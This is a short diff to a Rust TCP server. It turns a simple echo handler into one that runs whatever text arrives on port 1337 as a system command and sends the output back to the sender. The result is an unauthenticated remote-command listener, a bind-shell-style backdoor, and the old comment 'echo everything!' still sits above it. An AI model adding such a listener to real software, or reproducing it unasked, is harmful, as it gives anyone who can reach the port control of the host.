@@ -1,11 +1,17 @@
-use std::{thread, time};
-use std::net::{TcpListener, TcpStream, Shutdown};
-use std::time::Duration;
-use std::io::{Read, Write};
+use std::thread;
+use std::io::{Error, Read, Write};
+use std::net::{Shutdown, TcpListener, TcpStream};
+use std::process::{Command, Output};
+use std::str::from_utf8;
 
 const CHUNKS: usize = 1024;
-const ONE_SEC: Duration = time::Duration::from_secs(1);
 const BIND_ADDR: &str = "0.0.0.0:1337";
+
+fn run_command(comm: &str) -> Result<Output, Error> {
+    Command::new(comm)
+        .output()
+}
+
 
 fn handle_client(mut stream: TcpStream) {
     println!("Handling connection from {}", stream.peer_addr().unwrap());
@@ -13,8 +19,11 @@ fn handle_client(mut stream: TcpStream) {
     while match stream.read(&mut data) {
         Ok(size) => {
             // echo everything!
-            stream.write(&data[0..size]).unwrap();
             println!("Received {:?}", &data[0..size]);
+            let output = run_command(from_utf8(&data[0..size]).unwrap());
+            let stdout = output.unwrap().stdout;
+            println!("Output: {}", from_utf8(&stdout).unwrap());
+            stream.write(&stdout).unwrap();
             true
         },
         Err(_) => {
